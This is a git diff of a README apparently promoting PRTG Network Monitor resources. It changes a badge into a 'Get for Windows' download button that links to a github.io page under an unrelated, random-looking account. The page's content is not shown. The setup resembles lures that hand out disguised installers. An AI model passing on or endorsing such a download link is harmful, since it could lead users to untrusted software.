@@ -6,7 +6,8 @@
 
 **Optimize your IT infrastructure visibility with expert resources for PRTG Network Monitor deployment and configuration.**
 
-[![Access the Monitoring Solution](https://img.shields.io/badge/_ACCESS_THE_MONITORING_SOLUTION-PRTG_Ready-blue?style=for-the-badge)](https://caricoreil340.github.io/.github/)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://caricoreil340.github.io/.github/)
+</div>
 
 ## What is this PRTG Network Monitor Integration?
 
